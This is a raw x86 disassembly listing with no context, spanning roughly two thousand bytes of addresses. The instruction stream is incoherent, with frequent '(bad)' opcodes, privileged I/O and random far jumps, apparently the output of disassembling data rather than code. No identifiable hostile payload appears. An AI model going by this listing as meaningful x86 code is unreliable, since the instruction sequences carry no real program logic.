  416d47:	xchg   ebx,eax
  416d48:	(bad)  
  416d49:	jb     0x416d53
  416d4b:	fiadd  DWORD PTR [ebx-0x50]
  416d4e:	inc    ebp
  416d4f:	frstor [ebx]
  416d51:	jmp    0x416d58
  416d53:	call   DWORD PTR [ecx]
  416d55:	jbe    0x416cdd
  416d57:	push   ebp
  416d58:	dec    ebp
  416d59:	lods   eax,DWORD PTR ds:[esi]
  416d5a:	cmp    bh,BYTE PTR [edi+0x39]
  416d5d:	sbb    edi,esp
  416d5f:	push   es
  416d60:	js     0x416db5
  416d62:	fwait
  416d63:	imul   ecx,esi,0x88a145a1
  416d69:	cmp    ah,ch
  416d6b:	into   
  416d6c:	je     0x416db1
  416d6e:	dec    ebp
  416d6f:	lahf   
  416d70:	into   
  416d71:	xchg   dl,dh
  416d73:	das    
  416d74:	xor    DWORD PTR [ecx-0x19],esp
  416d77:	pop    ss
  416d78:	fisttp DWORD PTR [ebx]
  416d7a:	jmp    0x1fa:0x412b2fad
  416d81:	add    bh,ah
  416d83:	ins    DWORD PTR es:[edi],dx
  416d84:	jmp    0x283d:0x3aa3782a
  416d8b:	add    BYTE PTR [eax-0x6c6eda71],bh
  416d91:	xor    DWORD PTR [esi],edi
  416d93:	jns    0x416d17
  416d95:	mov    ah,0xd3
  416d97:	aas    
  416d98:	or     al,0xb1
  416d9a:	das    
  416d9b:	fistp  WORD PTR [ecx]
  416d9d:	div    DWORD PTR [ebx]
  416d9f:	xchg   edi,ecx
  416da1:	mov    cl,0x41
  416da3:	add    edx,0x73efd26a
  416da9:	popf   
  416daa:	fsubr  DWORD PTR es:[eax]
  416dad:	xor    DWORD PTR [ebp-0x6f25f15a],ecx
  416db3:	fistp  WORD PTR [ecx]
  416db5:	stos   DWORD PTR es:[edi],eax
  416db6:	(bad)  
  416db7:	cmp    DWORD PTR [ecx-0x3f],esi
  416dba:	daa    
  416dbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dbc:	repz pushf 
  416dbe:	cld    
  416dbf:	outs   dx,DWORD PTR ds:[esi]
  416dc0:	sbb    eax,0x16d3480e
  416dc5:	ja     0x416d48
  416dc7:	mov    WORD PTR [eax],cs
  416dc9:	aam    0x66
  416dcb:	outs   dx,DWORD PTR ds:[esi]
  416dcc:	cmp    ebp,ebp
  416dce:	xchg   DWORD PTR [esi-0x3d88ca02],ebp
  416dd4:	psllq  mm7,QWORD PTR [esi]
  416dd7:	push   esp
  416dd8:	and    BYTE PTR [ebx],al
  416dda:	sbb    al,0x19
  416ddc:	inc    ebp
  416ddd:	inc    esp
  416dde:	test   al,0x11
  416de0:	add    al,BYTE PTR [ebp-0x42917b18]
  416de6:	sbb    eax,0xce3dba89
  416deb:	stc    
  416dec:	dec    ebp
  416ded:	out    0xfa,al
  416def:	fnsave [edi+0x593a0d8a]
  416df5:	add    al,0xcd
  416df7:	pushf  
  416df8:	mov    al,0x5f
  416dfa:	fcmovne st,st(1)
  416dfc:	sahf   
  416dfd:	(bad)  
  416dfe:	xchg   ecx,eax
  416dff:	loop   0x416df0
  416e01:	xchg   DWORD PTR [ebx-0x46],edi
  416e04:	jns    0x416da8
  416e06:	out    0x83,eax
  416e08:	aas    
  416e09:	leave  
  416e0a:	pop    eax
  416e0b:	sub    BYTE PTR [edi],ch
  416e0d:	cmp    DWORD PTR [edi-0x53826906],ebx
  416e13:	mov    BYTE PTR [edx+0x54],0xe8
  416e17:	jne    0x416e7d
  416e19:	bound  esp,QWORD PTR [esi+ebp*2]
  416e1c:	inc    edi
  416e1d:	inc    eax
  416e1e:	sub    eax,0x2aae8ab4
  416e23:	inc    edi
  416e24:	sti    
  416e25:	inc    ebp
  416e26:	aad    0xe6
  416e28:	pop    ebx
  416e29:	inc    ebx
  416e2a:	aaa    
  416e2b:	pushf  
  416e2c:	(bad)  [edx+eax*8]
  416e2f:	dec    ebp
  416e30:	adc    BYTE PTR [esi-0x5565a299],0x54
  416e37:	aaa    
  416e38:	adc    dh,BYTE PTR [ebp-0x80]
  416e3b:	sub    BYTE PTR [esi+ebp*4+0x77],ch
  416e3f:	pop    esi
  416e40:	pushf  
  416e41:	(bad)  
  416e42:	or     ah,ah
  416e44:	mov    ?,eax
  416e46:	jno    0x416de4
  416e48:	pop    ds
  416e49:	and    eax,0xa36a9a56
  416e4e:	lds    edi,FWORD PTR [ebx]
  416e50:	pop    esi
  416e51:	xor    al,0x23
  416e53:	mov    ds:0x7f835d65,al
  416e58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e59:	cmp    dh,BYTE PTR [ebx-0x7e71f598]
  416e5f:	in     eax,dx
  416e60:	pop    ebx
  416e61:	sar    esi,0xa0
  416e64:	mov    eax,ss:0xfa6c5bdf
  416e6a:	or     BYTE PTR [ebx+edi*2],cl
  416e6d:	mov    ebx,0x9b89859d
  416e72:	and    al,0x82
  416e74:	call   0xf3ff:0x697f5cfb
  416e7b:	data16 jge 0x416e63
  416e7e:	mov    ch,0x32
  416e80:	sbb    ch,BYTE PTR [ebp+0x1b73b502]
  416e86:	retf   0x928b
  416e89:	enter  0xc67b,0x41
  416e8d:	icebp  
  416e8e:	retf   
  416e8f:	int3   
  416e90:	jns    0x416e17
  416e92:	rcr    DWORD PTR [edi+0x421a4fca],1
  416e98:	cmp    bh,BYTE PTR [edx]
  416e9a:	pushf  
  416e9b:	dec    esp
  416e9c:	in     al,dx
  416e9d:	mov    eax,ds:0x498f75ec
  416ea2:	leave  
  416ea3:	(bad)  
  416ea4:	ins    DWORD PTR es:[edi],dx
  416ea5:	repnz fwait
  416ea7:	push   ebx
  416ea8:	mov    dh,0x37
  416eaa:	jns    0x416ecb
  416eac:	sar    BYTE PTR [ecx-0x52629af4],0x33
  416eb3:	hlt    
  416eb4:	cdq    
  416eb5:	xchg   esi,eax
  416eb6:	pop    es
  416eb7:	ins    DWORD PTR es:[edi],dx
  416eb8:	es cmp eax,0x31c3d431
  416ebe:	inc    eax
  416ebf:	ror    DWORD PTR [edx+0x6a],0x4d
  416ec3:	in     al,dx
  416ec4:	repz out dx,al
  416ec6:	sbb    edi,DWORD PTR [edi]
  416ec8:	loop   0x416eae
  416eca:	sub    esi,ebp
  416ecc:	mov    al,ds:0x7f11b00a
  416ed1:	int3   
  416ed2:	lahf   
  416ed3:	pop    edi
  416ed4:	xchg   ebx,eax
  416ed5:	cmp    BYTE PTR [edi+0x2d40d199],ah
  416edb:	ror    ecx,1
  416edd:	pop    eax
  416ede:	xor    ah,al
  416ee0:	scas   eax,DWORD PTR es:[edi]
  416ee1:	jbe    0x416f5f
  416ee3:	aaa    
  416ee4:	lock fisub DWORD PTR [eax+0x31]
  416ee8:	or     DWORD PTR [ebp+0x5c],ebp
  416eeb:	push   eax
  416eec:	or     BYTE PTR [ebx-0xde1a6f],bh
  416ef2:	push   cs
  416ef3:	sbb    ecx,DWORD PTR [edx-0x5b]
  416ef6:	mov    ah,0xba
  416ef8:	out    dx,eax
  416ef9:	retf   
  416efa:	pop    ds
  416efb:	imul   esp,DWORD PTR [edi*2-0x48636870],0xca8a3b01
  416f06:	(bad)  
  416f07:	clc    
  416f08:	pop    esi
  416f09:	dec    esi
  416f0a:	push   esp
  416f0b:	rol    DWORD PTR [esi],1
  416f0d:	aam    0xd5
  416f0f:	daa    
  416f10:	inc    esi
  416f11:	lds    edx,FWORD PTR [edx]
  416f13:	jg     0x416f6b
  416f15:	(bad)  
  416f16:	cli    
  416f17:	dec    esp
  416f18:	cli    
  416f19:	addr16 je 0x416edc
  416f1c:	repnz dec esi
  416f1e:	bound  ebx,QWORD PTR [edi]
  416f20:	je     0x416eb4
  416f22:	fld    QWORD PTR [eax+edx*8]
  416f25:	mov    ch,0x34
  416f27:	mov    esi,0xdc15fafd
  416f2c:	inc    ecx
  416f2d:	dec    edx
  416f2e:	jle    0x416f66
  416f30:	push   edi
  416f31:	sbb    DWORD PTR [edx-0x6e],0x6781fbec
  416f38:	in     al,0x5c
  416f3a:	popf   
  416f3b:	mov    eax,0x1a4f2128
  416f40:	adc    eax,DWORD PTR [bx+si+0x41]
  416f44:	cli    
  416f45:	(bad)  
  416f46:	std    
  416f47:	dec    esi
  416f48:	xchg   edx,eax
  416f49:	icebp  
  416f4a:	and    DWORD PTR ds:0x7656e050,ecx
  416f50:	jne    0x416f54
  416f52:	xor    eax,0xf7f45699
  416f57:	mov    DWORD PTR [edi-0x4f],edx
  416f5a:	xor    BYTE PTR [eax],0x29
  416f5d:	adc    ah,BYTE PTR [eax]
  416f5f:	(bad)  
  416f60:	fdiv   QWORD PTR [edi+0x4a0e34c7]
  416f66:	ret    0x109d
  416f69:	inc    eax
  416f6a:	aad    0x63
  416f6c:	inc    esp
  416f6d:	mov    dh,0x4a
  416f6f:	imul   ecx,ebp,0x4894131f
  416f75:	xchg   ecx,eax
  416f76:	push   ss
  416f77:	lea    edi,[ecx+0x76dcac56]
  416f7d:	xor    eax,0x2fdb74f8
  416f82:	xlat   BYTE PTR ds:[ebx]
  416f83:	dec    esi
  416f84:	dec    eax
  416f85:	enter  0x49e9,0x7
  416f89:	icebp  
  416f8a:	out    0x4e,eax
  416f8c:	pop    ebx
  416f8e:	cwde   
  416f8f:	out    dx,al
  416f90:	add    ecx,DWORD PTR [edi]
  416f92:	test   al,0x1e
  416f94:	retf   0xa381
  416f97:	push   0x7f025142
  416f9c:	ror    BYTE PTR [ebx],1
  416f9e:	mov    DWORD PTR [edx-0x75],ebx
  416fa1:	adc    al,0x8
  416fa3:	adc    al,0x11
  416fa5:	push   cs
  416fa6:	test   DWORD PTR [edi+eiz*1+0x3bc15849],edx
  416fad:	cmp    eax,DWORD PTR [esi+0x67145eed]
  416fb3:	retf   0x19e9
  416fb6:	sbb    al,0xb8
  416fb8:	sbb    dl,dh
  416fba:	mov    ebx,0x93f09fe4
  416fbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fc0:	pop    es
  416fc1:	jmp    WORD PTR [edi+edx*1-0x6ba705de]
  416fc9:	lods   al,BYTE PTR ds:[esi]
  416fca:	iret   
  416fcb:	lea    edx,[ecx+0x74]
  416fce:	out    dx,eax
  416fcf:	mov    edx,DWORD PTR [esi-0x3e]
  416fd2:	retf   0x150f
  416fd5:	in     al,0xa6
  416fd7:	push   0x9
  416fd9:	sub    edx,esi
  416fdb:	loope  0x416f84
  416fdd:	les    ebp,FWORD PTR [ebx]
  416fdf:	mov    ah,0x1c
  416fe1:	cli    
  416fe2:	loopne 0x416fbe
  416fe4:	xchg   DWORD PTR [esi-0x17750522],ecx
  416fea:	jae    0x416ffd
  416fec:	jg     0x416fc8
  416fee:	outs   dx,BYTE PTR ds:[esi]
  416fef:	push   eax
  416ff0:	add    DWORD PTR [edx],edx
  416ff2:	outs   dx,BYTE PTR ds:[esi]
  416ff3:	mov    WORD PTR [ecx-0x60],?
  416ff6:	xchg   ebx,eax
  416ff7:	mov    ecx,DWORD PTR [eax+0x557b2015]
  416ffd:	mov    ecx,0xc16a55e1
  417002:	sahf   
  417003:	je     0x417066
  417005:	js     0x41704a
  417007:	ds aad 0xbd
  41700a:	pop    ebx
  41700b:	in     eax,dx
  41700c:	push   ecx
  41700d:	inc    eax
  41700e:	adc    DWORD PTR [edi+0x57],ebp
  417011:	jge    0x416feb
  417013:	fidiv  DWORD PTR [eax-0x37]
  417016:	data16 mov cl,0xcc
  417019:	(bad)  
  41701a:	push   edi
  41701b:	repz (bad) 
  41701e:	xor    ch,BYTE PTR [ebp-0x78]
  417021:	push   esp
  417022:	pop    esi
  417023:	mov    edx,0xb4f92d83
  417028:	fs jle 0x417055
  41702b:	inc    edx
  41702c:	dec    edi
  41702d:	(bad)  [edx-0x67]
  417030:	dec    ecx
  417031:	mov    cl,BYTE PTR cs:0x925c512e
  417038:	jge    0x417054
  41703a:	mov    WORD PTR [eax+0x2fbb76ad],cs
  417040:	add    bh,dh
  417042:	jl     0x417082
  417044:	xlat   BYTE PTR ds:[ebx]
  417045:	mov    ss,WORD PTR [esp+edx*4-0x21]
  417049:	(bad)  
  41704a:	rcr    BYTE PTR [eax-0x6284b47d],1
  417050:	aas    
  417051:	fist   WORD PTR [esi]
  417053:	sbb    BYTE PTR [ebp-0x5995ae0d],ah
  417059:	xchg   esp,eax
  41705a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41705b:	mov    cl,BYTE PTR [esi-0x76f2e025]
  417061:	sub    dh,ch
  417063:	es dec edx
  417065:	retf   
  417066:	and    esp,DWORD PTR [eax-0x65d65ee3]
  41706c:	ja     0x417071
  41706e:	dec    edi
  41706f:	jmp    0x4170ad
  417071:	mov    esp,0x4f73967b
  417076:	inc    edx
  417077:	lock dec esp
  417079:	popf   
  41707a:	jl     0x417081
  41707c:	in     al,0x8a
  41707e:	inc    esi
  41707f:	adc    al,0x88
  417081:	iret   
  417082:	std    
  417083:	js     0x4170cc
  417085:	shl    dh,1
  417087:	xor    esi,DWORD PTR ds:0x52861696
  41708d:	cli    
  41708e:	in     al,dx
  41708f:	jb     0x417047
  417091:	push   eax
  417092:	ins    DWORD PTR es:[edi],dx
  417093:	dec    edx
  417094:	dec    eax
  417095:	and    DWORD PTR ds:0xe684e92c,esi
  41709b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41709c:	in     al,dx
  41709d:	pop    es
  41709e:	cmp    ebx,DWORD PTR [di+0x2068]
  4170a3:	enter  0xeb62,0x7
  4170a7:	cli    
  4170a8:	jl     0x41708e
  4170aa:	xor    BYTE PTR [ecx+0x49cb08b1],ah
  4170b0:	mov    al,0xf3
  4170b2:	lahf   
  4170b3:	nop
  4170b4:	aad    0xe5
  4170b6:	push   esi
  4170b7:	mov    edi,edx
  4170b9:	xor    al,0x1
  4170bb:	sbb    BYTE PTR [ebx-0x26eaf5f0],0x2f
  4170c2:	dec    ebp
  4170c3:	cdq    
  4170c4:	adc    eax,0x43dfc681
  4170c9:	and    DWORD PTR [edi+ebp*8-0xee1fac5],ebp
  4170d0:	outs   dx,BYTE PTR ds:[esi]
  4170d1:	cmp    eax,0x557d2289
  4170d6:	cdq    
  4170d7:	and    eax,ecx
  4170d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170da:	xchg   ebx,eax
  4170db:	mov    bh,0xa8
  4170dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170de:	sbb    al,dl
  4170e0:	clc    
  4170e1:	fwait
  4170e2:	lds    edx,FWORD PTR [esi-0x59]
  4170e5:	fdiv   QWORD PTR [ecx+0x179d6179]
  4170eb:	xor    eax,0x12fc234c
  4170f0:	or     BYTE PTR [ebx-0x621233f],al
  4170f6:	lahf   
  4170f7:	xchg   edi,eax
  4170f8:	xchg   bl,al
  4170fa:	je     0x41707c
  4170fc:	adc    bh,BYTE PTR [esi-0x63]
  4170ff:	xchg   edx,eax
  417100:	stc    
  417101:	ss pop ecx
  417103:	nop
  417104:	gs sti 
  417106:	add    al,0x52
  417108:	pusha  
  417109:	cmp    bl,BYTE PTR [esi-0x9b6a0c8]
  41710f:	adc    edx,DWORD PTR ds:0x59aeb989
  417115:	adc    ebx,0xdeeae730
  41711b:	or     al,0xde
  41711d:	sub    eax,0x73d9b8
  417122:	pop    es
  417123:	addr16 ja 0x417118
  417126:	sub    al,0xef
  417128:	addr16 stc 
  41712a:	in     al,dx
  41712b:	sub    al,0x97
  41712e:	adc    DWORD PTR [eax-0x671791fa],eax
  417134:	ins    BYTE PTR es:[edi],dx
  417135:	inc    esi
  417136:	and    al,0xba
  417138:	arpl   WORD PTR [edx+0x49],di
  41713b:	cwde   
  41713c:	adc    BYTE PTR [ebx],al
  41713e:	js     0x417164
  417140:	test   BYTE PTR [edi+0x6],bl
  417143:	pop    es
  417144:	jmp    0x6812:0xd7ed550a
  41714b:	fistp  DWORD PTR [edx]
  41714d:	xchg   ebp,eax
  41714e:	lea    ebx,[eax+0x79]
  417151:	arpl   WORD PTR [ebp-0x1a],cx
  417154:	mov    dh,BYTE PTR [edx-0x10]
  417157:	jns    0x4170e4
  417159:	or     edx,DWORD PTR [ebp-0x4]
  41715c:	xor    BYTE PTR ds:0x2041ece7,ah
  417162:	sbb    eax,0xc8a32e68
  417167:	cmp    edi,ecx
  417169:	pushf  
  41716a:	or     BYTE PTR ds:0x9e2c0f49,ch
  417170:	mov    al,ds:0x131d6b26
  417175:	stos   DWORD PTR es:[edi],eax
  417176:	fmul   DWORD PTR [esi]
  417178:	rol    DWORD PTR [ecx-0x6f68a946],cl
  41717e:	jmp    DWORD PTR [edi+0x4c575290]
  417184:	xor    BYTE PTR [esp+esi*2],ch
  417187:	or     eax,0x2766764f
  41718c:	xor    DWORD PTR [ecx-0x2ca5236a],0x995b4c41
  417196:	xchg   esi,eax
  417197:	inc    edi
  417198:	gs pusha 
  41719a:	(bad)  
  41719b:	cs (bad) 
  41719d:	nop
  41719e:	add    DWORD PTR [edi-0x5b3968c8],0xda03bb4e
  4171a8:	inc    ebx
  4171a9:	and    dh,ch
  4171ab:	adc    eax,0xa2bf469d
  4171b0:	ror    DWORD PTR [esi],1
  4171b2:	jmp    0x4171b6
  4171b4:	daa    
  4171b5:	(bad)  
  4171b6:	ret    
  4171b7:	inc    eax
  4171b8:	cmp    DWORD PTR [ebx+0x8d5b3da],edx
  4171be:	out    dx,al
  4171bf:	aaa    
  4171c0:	inc    ebp
  4171c1:	mov    esi,0x4ed69b42
  4171c6:	dec    edx
  4171c7:	dec    esi
  4171c8:	(bad)  
  4171c9:	into   
  4171ca:	xor    BYTE PTR [esi+0x6],cl
  4171cd:	fsubr  DWORD PTR [eax+0x59b44a27]
  4171d3:	mov    eax,0x694a237
  4171d8:	retf   
  4171d9:	cwde   
  4171da:	push   0xfcb6a7af
  4171df:	sbb    DWORD PTR [esi],0xd4a0ebc7
  4171e5:	cli    
  4171e6:	and    ebp,DWORD PTR [ecx-0x162406d0]
  4171ec:	dec    ebp
  4171ed:	mov    es,WORD PTR [ecx]
  4171ef:	call   0x9eb0:0xc3bd5a13
  4171f6:	lds    esi,FWORD PTR [edi-0x27]
  4171f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171fa:	sahf   
  4171fb:	mov    WORD PTR [esi],es
  4171fd:	pop    ds
  4171fe:	mov    ecx,0x4e384cab
  417203:	mov    fs,esp
  417205:	add    al,0x22
  417207:	jp     0x4171cf
  417209:	ficom  DWORD PTR [eax+ebx*8]
  41720c:	test   al,0xfc
  41720e:	out    0xaa,eax
  417210:	(bad)  
  417211:	call   0x9569:0x3c48c2af
  417218:	and    esp,DWORD PTR [esi+esi*8+0x11]
  41721c:	mov    esp,0x98558959
  417221:	fdivr  QWORD PTR [ebx-0x1a871501]
  417227:	ja     0x4171bc
  417229:	imul   ebx,DWORD PTR ds:0x64a7f73a,0x38
  417230:	pop    esp
  417231:	aam    0x5e
  417233:	outs   dx,DWORD PTR ds:[esi]
  417234:	in     eax,dx
  417235:	jo     0x4171c3
  417237:	push   es
  417238:	adc    dl,BYTE PTR [edx-0x24]
  41723b:	rol    DWORD PTR [esi-0x5a],cl
  41723e:	scas   al,BYTE PTR es:[edi]
  41723f:	ror    BYTE PTR [ebp-0x2919b4b5],cl
  417245:	pop    eax
  417246:	push   ebx
  417247:	out    dx,eax
  417248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417249:	jp     0x417203
  41724b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41724c:	das    
  41724d:	(bad)  
  41724e:	call   0x69c8818a
  417253:	push   ds
  417254:	das    
  417255:	mov    esi,0x36bbc00c
  41725a:	pop    es
  41725b:	jle    0x4171fa
  41725d:	in     eax,dx
  41725e:	push   ds
  41725f:	inc    bx
  417261:	data16 aam 0x61
  417264:	fsubr  st(3),st
  417266:	outs   dx,BYTE PTR ds:[esi]
  417267:	or     al,0xdf
  417269:	sbb    dh,BYTE PTR [ebx]
  41726b:	xchg   ecx,eax
  41726c:	es mov al,0x6
  41726f:	(bad)  
  417270:	cmp    bl,ah
  417272:	adc    esp,ecx
  417274:	or     edi,DWORD PTR cs:[edi-0x9]
  417278:	mov    esi,0x9c96e339
  41727d:	sub    dl,bl
  41727f:	shl    esi,1
  417281:	sub    al,0xa6
  417283:	daa    
  417284:	fistp  QWORD PTR [ecx+0x6b]
  417287:	inc    ebx
  417288:	stos   DWORD PTR es:[edi],eax
  417289:	sub    ebp,DWORD PTR [ebx]
  41728b:	pop    eax
  41728c:	jp     0x417273
  41728e:	test   eax,0x8caf5d1d
  417293:	aam    0x8a
  417295:	mov    edx,0xf4495f23
  41729a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41729b:	retf   
  41729c:	repnz and edx,esi
  41729f:	fnsave [ecx-0x41]
  4172a2:	add    DWORD PTR [ecx+0x7f999b06],edi
  4172a8:	test   dh,ah
  4172aa:	push   ebx
  4172ab:	push   ds
  4172ac:	mov    cl,0xb8
  4172ae:	ja     0x417259
  4172b0:	dec    ebp
  4172b1:	mov    al,ds:0xea27f5cd
  4172b6:	mov    bl,BYTE PTR [eax+esi*2+0x198f8d1b]
  4172bd:	push   0x7a430ae7
  4172c2:	fisub  WORD PTR [esi]
  4172c4:	jle    0x417262
  4172c6:	and    ebx,edx
  4172c8:	jo     0x41726e
  4172ca:	sub    eax,0xea5c5e96
  4172cf:	out    0xac,eax
  4172d1:	(bad)  [esi]
  4172d3:	jle    0x4172ef
  4172d5:	call   0x64bbfa6b
  4172da:	cmp    al,0xb
  4172dc:	mov    al,ds:0x70f5a70b
  4172e1:	inc    ebx
  4172e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172e3:	inc    esp
  4172e4:	jb     0x417345
  4172e6:	lock cld 
  4172e8:	test   DWORD PTR [esp+eax*1+0x6543819a],ecx
  4172ef:	push   ss
  4172f0:	xor    BYTE PTR [ebx],cl
  4172f2:	pop    edi
  4172f3:	cmp    DWORD PTR [ecx+0x6028ddcf],esi
  4172f9:	js     0x417354
  4172fb:	jp     0x417286
  4172fd:	scas   eax,DWORD PTR es:[edi]
  4172fe:	das    
  4172ff:	mov    ds:0x67dcb211,al
  417304:	in     eax,0xfd
  417306:	icebp  
  417307:	mov    WORD PTR [ebx-0x3cc135e8],?
  41730d:	(bad)  
  41730e:	mov    BYTE PTR [eax+0x79becbd6],dl
  417314:	mov    WORD PTR [bp+si],cs
  417317:	push   ecx
  417318:	scas   eax,DWORD PTR es:[edi]
  417319:	(bad)  
  41731a:	(bad)  
  41731b:	in     al,0xcb
  41731d:	pushf  
  41731e:	sbb    BYTE PTR [ecx+0x3d],dl
  417321:	sbb    eax,0x6a66bebd
  417326:	fstp   DWORD PTR [eax+0x7a]
  417329:	sbb    BYTE PTR ds:0xaf630a21,ch
  41732f:	jne    0x41737f
  417331:	outs   dx,BYTE PTR ds:[esi]
  417332:	jnp    0x417301
  417334:	mov    edi,ss
  417336:	sub    DWORD PTR [edi-0x3ddd72d5],esi
  41733c:	packuswb mm6,QWORD PTR [eax+0x23e8b3bd]
  417343:	push   0x5b482fa4
  417348:	stos   DWORD PTR es:[edi],eax
  417349:	pushf  
  41734a:	cmp    DWORD PTR [eax],eax
  41734c:	pop    edi
  41734d:	in     al,0xe1
  41734f:	add    BYTE PTR [esi+0x648d323a],dh
  417355:	add    DWORD PTR [ebp+0x52],esp
  417358:	aaa    
  417359:	pop    esi
  41735a:	dec    esi
  41735b:	jecxz  0x41734e
  41735d:	repnz xchg esp,eax
  41735f:	fwait
  417360:	(bad)  
  417361:	cmp    esi,edx
  417363:	mov    edi,0xfd1c6ca3
  417368:	and    esp,ebx
  41736a:	data16 std 
  41736c:	int    0xc0
  41736e:	mov    ebx,0xc4987863
  417373:	popf   
  417374:	(bad)  
  417375:	fiadd  WORD PTR [eax]
  417377:	jbe    0x4173cc
  417379:	dec    ebp
  41737a:	fcomip st,st(1)
  41737c:	inc    esp
  41737d:	or     dh,dh
  41737f:	ror    BYTE PTR [edi],0xcc
  417382:	or     ebp,eax
  417384:	jg     0x4173d7
  417386:	daa    
  417387:	push   0xffffffd7
  417389:	out    0xca,al
  41738b:	mov    eax,ds:0xea04ded5
  417390:	jb     0x4173d8
  417392:	inc    edx
  417393:	outs   dx,BYTE PTR ds:[esi]
  417394:	dec    ecx
  417395:	scas   al,BYTE PTR es:[edi]
  417396:	mov    ebp,0xf2ada607
  41739b:	mov    ah,0x47
  41739d:	test   BYTE PTR cs:[esi],0xf0
  4173a1:	inc    edi
  4173a2:	inc    ecx
  4173a3:	push   ds
  4173a4:	scas   al,BYTE PTR es:[edi]
  4173a5:	lods   eax,DWORD PTR ds:[esi]
  4173a6:	jmp    FWORD PTR [ecx+ebx*2+0x2abb60a8]
  4173ad:	out    0xd7,al
  4173af:	neg    DWORD PTR [ebp-0x5a]
  4173b2:	sub    BYTE PTR [ebx+0x1a],ah
  4173b5:	(bad)  
  4173b6:	jbe    0x4173d8
  4173b8:	fsubr  QWORD PTR [eax+0x63]
  4173bb:	mov    esp,0xae442ef9
  4173c0:	push   es
  4173c1:	mov    esi,0x51a8749
  4173c6:	in     eax,dx
  4173c7:	imul   eax,DWORD PTR [esi+0x2a9c2c2a]
  4173ce:	xchg   DWORD PTR [esi+0x36],esi
  4173d1:	xchg   ebp,eax
  4173d2:	adc    dh,BYTE PTR ss:[eax+esi*2-0x2]
  4173d7:	xchg   ebp,eax
  4173d8:	inc    eax
  4173d9:	mov    esi,esi
  4173db:	out    dx,al
  4173dc:	lahf   
  4173dd:	inc    ebx
  4173de:	push   edi
  4173df:	cld    
  4173e0:	test   eax,0xc4f6fda0
  4173e5:	sub    BYTE PTR [edx],cl
  4173e7:	add    al,0x1d
  4173e9:	(bad)  
  4173eb:	xchg   esi,eax
  4173ec:	inc    esp
  4173ed:	mov    esp,0x44e5ba3
  4173f2:	xchg   edi,eax
  4173f3:	pop    ecx
  4173f4:	or     ah,BYTE PTR [esi-0x1dd0b6c3]
  4173fa:	sahf   
  4173fb:	and    dl,dh
  4173fd:	fcom   QWORD PTR [ebx]
  4173ff:	adc    esp,DWORD PTR ds:0x4596517c
  417405:	dec    esi
  417406:	jbe    0x41742d
  417408:	sub    eax,0x2871c4b6
  41740d:	mov    bl,0x1d
  41740f:	sbb    DWORD PTR [ebx+0x28b01cb6],eax
  417415:	push   edx
  417416:	in     al,dx
  417417:	enter  0x5fd0,0x9c
  41741b:	pop    edx
  41741c:	sub    dh,ch
  41741e:	inc    ecx
  41741f:	jo     0x417474
  417421:	mov    ah,0x4e
  417423:	stc    
  417424:	ret    
  417425:	inc    eax
  417426:	(bad)  
  417427:	in     eax,dx
  417428:	cmp    dh,BYTE PTR ds:0xe5b0167a
  41742e:	mov    bh,0xfd
  417430:	xchg   esp,eax
  417431:	inc    eax
  417432:	mov    bl,0x23
  417434:	mov    edi,0xd3be21e3
  417439:	imul   ebx,DWORD PTR [eax],0x51ebbafb
  41743f:	and    dl,BYTE PTR [esi+0x3d]
  417442:	xor    BYTE PTR [ecx],ch
  417444:	clc    
  417445:	jle    0x417424
  417447:	in     eax,0xe7
  417449:	cmp    BYTE PTR [eax+edi*8-0x7c],dl
  41744d:	out    0xfc,al
  41744f:	push   esp
  417450:	shr    ebx,0xa3
  417453:	aad    0x85
  417455:	daa    
  417456:	and    ecx,ebp
  417458:	mov    dl,0x8b
  41745a:	aam    0x6e
  41745c:	inc    esi
  41745d:	mov    BYTE PTR [edi+0x7b],dh
  417460:	jo     0x417403
  417462:	fsubr  QWORD PTR [edi+0x25]
  417465:	inc    ebx
  417466:	dec    ebx
  417467:	(bad)  
  417468:	pusha  
  417469:	aad    0x6a
  41746b:	mov    ah,0xef
  41746d:	and    al,dh
  41746f:	push   esp
  417470:	pop    ebp
  417471:	dec    edi
  417472:	cld    
  417473:	xchg   ecx,eax
  417474:	int    0x8b
  417476:	fcmove st,st(1)
  417478:	fnstenv [ebp-0x33]
  41747b:	push   esi
  41747c:	inc    edi
  41747d:	rcl    ah,0x49
  417480:	lds    edx,FWORD PTR [eax]
  417482:	ror    BYTE PTR [ecx+0x72a35b49],1
  417488:	in     al,0xc0
  41748a:	pop    edi
  41748b:	adc    al,0x61
  41748d:	and    al,0x97
  41748f:	push   ebp
  417490:	in     al,0xee
  417492:	mov    BYTE PTR [edx],ah
  417494:	sub    cl,BYTE PTR [edx+ebx*1+0x29]
  417498:	xor    dh,BYTE PTR [edx-0x73]
  41749b:	fs mov dl,0x6f
  41749e:	mov    ah,0x4a
  4174a0:	pop    ebx
  4174a1:	mov    WORD PTR [ebp-0x37d2885c],?
  4174a7:	adc    eax,0x80193f90
  4174ac:	test   al,0xdb
  4174ae:	or     ebx,esp
  4174b0:	mov    ds,WORD PTR ds:0xa22820f7
  4174b6:	sub    eax,0xa2063d49
  4174bb:	je     0x41752a
  4174bd:	pop    ss
  4174be:	js     0x4174a7
  4174c0:	int3   
  4174c1:	jp     0x4174b6
  4174c3:	xchg   esi,eax
  4174c4:	cld    
  4174c5:	push   0xffffffff
  4174c7:	popa   
  4174c8:	dec    ebx
  4174c9:	icebp  
  4174ca:	sub    DWORD PTR [edx],ecx
  4174cc:	add    al,0x55
  4174ce:	lods   al,BYTE PTR ds:[esi]
  4174cf:	out    dx,al
  4174d0:	or     al,0xd3
  4174d2:	sbb    BYTE PTR [esi-0x2a],0x23
  4174d6:	pop    es
  4174d7:	and    edi,DWORD PTR [edi-0x46]
  4174da:	hlt    
  4174db:	stos   DWORD PTR es:[edi],eax
  4174dc:	jmp    0x41754c
  4174de:	pop    es
  4174df:	add    DWORD PTR [esi+0x44],0x1a
  4174e3:	outs   dx,DWORD PTR ds:[esi]
  4174e4:	imul   ebp,edx,0x41fc5b3f
